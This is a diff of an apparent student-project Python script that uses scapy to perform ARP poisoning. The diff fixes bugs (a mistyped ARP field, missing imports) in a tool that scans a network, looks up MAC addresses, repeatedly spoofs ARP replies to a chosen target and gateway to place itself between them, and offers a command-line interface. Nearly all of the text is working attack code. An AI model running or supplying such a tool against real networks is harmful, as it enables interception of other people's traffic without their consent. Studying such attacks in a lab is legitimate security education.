@@ -1,11 +1,15 @@
 import scapy.all as sc;
+import argparse;
+import time;
 
-### This is the file for ARP poisoning. I'm not sure if it works or how to test it :)
 
-# Example run code that should do something, where x is ip range:
-# sudo python ARPpoisoning.py --scan x
-# When specific target and gateway are found, where y and z are ip adresses:
-# sudo python ARPpoisoning.py --target y --gateway z
+### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
+
+# Example run code that should do something, where x is ip range: 
+# python ARPpoisoning.py --scan x 
+# When specific target and gateway are found, where y and z are ip adresses: 
+# python ARPpoisoning.py --target y --gateway z
+
 
 ## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
 # Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
@@ -33,7 +37,7 @@ def poison(target_ip, poison_ip, target_mac):
 # (2.) Get the MAC adress of a given IP adress
 def get_mac(ip):
     # First we do the same as in network scan.
-    arp = sc.ARP(psdt=ip)
+    arp = sc.ARP(pdst=ip)
     broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = broadcast / arp
     packet_pairs = sc.srp(packet, timeout=2, verbose=False)[0]
@@ -57,14 +61,14 @@ def arp_poison_loop(target_ip, gateway_ip):
         while True:
             poison(target_ip, gateway_ip, target_mac)
             poison(gateway_ip, target_ip, gateway_mac)
-            sc.time.sleep(2)
+            time.sleep(2)
     except KeyboardInterrupt:
         stop_attack(target_ip, gateway_ip, target_mac, gateway_mac)
         stop_attack(gateway_ip, target_ip, gateway_mac, target_mac)
 
 ## Now that everything is set up, we want to make it easier to use this.
 if __name__ == "__main__":
-    parser = sc.argparse.ArgumentParser(description="ARP poisoning tool")
+    parser = argparse.ArgumentParser(description="ARP poisoning tool")
     parser.add_argument("--target", help="Target IP adress")
     parser.add_argument("--gateway", help="Gateway IP adress")
     parser.add_argument("--scan", help="Network IP range to scan", default=None)
